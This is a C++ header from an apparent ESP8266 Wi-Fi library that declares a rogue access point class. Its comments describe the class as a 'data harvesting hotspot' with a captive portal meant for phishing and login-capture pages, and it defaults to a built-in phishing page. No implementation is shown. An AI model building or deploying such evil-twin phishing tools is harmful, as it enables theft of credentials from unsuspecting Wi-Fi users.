/* DeautherX-lib — https://github.com/BlackTechX011/DeautherX-lib
   MIT License

   DeautherRogueAP — Custom Data Harvesting Hotspot

   Use this to spin up a custom AP (e.g. "Free Airport WiFi") and host
   a configurable captive portal. Provides robust JS APIs for users to build
   custom data collection pages (phishing, surveys, login forms) and stores
   everything directly onto the ESP flash via DStorage.
*/

#pragma once

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <functional>

struct RogueAPConfig {
    const char* ssid        = "Free WiFi";
    const char* password    = nullptr;  // Set to enable WPA2
    uint8_t     channel     = 1;
    bool        hidden      = false;
    uint8_t     bssid[6]    = {0};      // Custom BSSID optionally

    const char* customHtml  = nullptr;  // Use standard phishing page if null
    const char* successHtml = nullptr;
    const char* portalTitle = "Network Login";
    bool        injectJsApi = true;
};

class DeautherRogueAP {
public:
    using DataCb    = std::function<void(const String& dataType, const String& jsonData, const char* clientIP)>;
    using RequestCb = std::function<void(ESP8266WebServer& server)>;

    DeautherRogueAP();
    ~DeautherRogueAP();

    void start(const RogueAPConfig& cfg);
    void start(const char* ssid);
    void stop();
    void update();

    bool isRunning() const;

    // Callbacks
    void onDataReceived(DataCb cb);

    // Custom HTTP endpoints
    void addRoute(const char* uri, HTTPMethod method, RequestCb handler);
    void servePage(const char* uri, const char* html);

private:
    RogueAPConfig     _cfg;
    bool              _running = false;
    DNSServer*        _dns     = nullptr;
    ESP8266WebServer* _server  = nullptr;
    DataCb            _data_cb = nullptr;

    void _setupServer();
    String _injectJsApi(const String& html) const;
    void _handleApiSubmit();
    void _handleRoot();
    void _handleCaptiveCheck();
    void _handleNotFound();
};
